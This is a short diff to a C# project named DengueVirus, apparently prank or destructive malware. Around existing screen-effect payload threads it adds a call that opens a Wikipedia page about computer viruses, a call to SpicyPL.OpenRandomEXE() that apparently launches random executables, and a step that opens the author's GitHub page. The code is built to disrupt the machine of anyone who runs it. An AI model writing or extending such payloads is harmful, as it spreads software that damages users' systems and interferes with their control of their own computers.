@@ -416,6 +416,8 @@ namespace DengueVirus
 
             Thread.Sleep(5000);
 
+            Process.Start("start", "https://en.wikipedia.org/wiki/Computer_virus");
+
             text.Abort();
             t3.Abort();
             Thread t5 = new Thread(PatBltpayload); t5.Start();
@@ -439,6 +441,12 @@ namespace DengueVirus
             ico.Abort();
             //close form
             this.Close();
+
+            SpicyPL.OpenRandomEXE();
+
+            Thread.Sleep(5000);
+
+            Process.Start("start", "https://github.com/PatoFlamejanteTV/");
 
             winpos.Abort();
             fill.Abort();
